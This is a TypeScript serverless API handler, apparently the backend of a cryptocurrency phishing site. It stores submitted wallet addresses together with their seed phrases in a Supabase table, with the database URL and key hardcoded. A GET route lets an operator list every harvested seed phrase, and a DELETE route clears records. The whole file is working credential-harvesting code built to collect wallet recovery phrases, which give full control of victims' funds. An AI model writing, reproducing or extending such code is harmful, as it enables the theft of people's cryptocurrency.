import { VercelRequest, VercelResponse } from '@vercel/node';
import { createClient } from '@supabase/supabase-js';

const supabaseUrl = "https://tfkeuiktciczxurlvuct.supabase.co";
const supabaseKey = "sb_publishable_roHnvrQf_0JDkJgEoa5ryg_9mpBZlWR";

const supabase = createClient(supabaseUrl, supabaseKey);

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method === 'GET') {
    const { data, error } = await supabase
      .from('submissions')
      .select('id,wallet,seed_phrase,timestamp')
      .order('timestamp', { ascending: false });

    if (error) return res.status(500).json({ error: error.message });
    
    // Map snake_case to camelCase for frontend
    const mappedData = data?.map((item: any) => ({
      id: item.id,
      wallet: item.wallet,
      seedPhrase: item.seed_phrase,
      timestamp: item.timestamp
    }));
    
    return res.status(200).json(mappedData);
  }

  if (req.method === 'POST') {
    const { wallet, seedPhrase, timestamp } = req.body;
    if (!wallet || !seedPhrase || !timestamp) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const { data, error } = await supabase.from('submissions').insert([{ wallet, seed_phrase: seedPhrase, timestamp }]);

    if (error) return res.status(500).json({ error: error.message });
    return res.status(201).json(data?.[0]);
  }

  if (req.method === 'DELETE') {
    const id = req.query.id;
    if (!id) return res.status(400).json({ error: 'id required' });

    const { error } = await supabase.from('submissions').delete().eq('id', Number(id));
    if (error) return res.status(500).json({ error: error.message });

    return res.status(204).end();
  }

  res.status(405).json({ error: 'Method not allowed' });
}
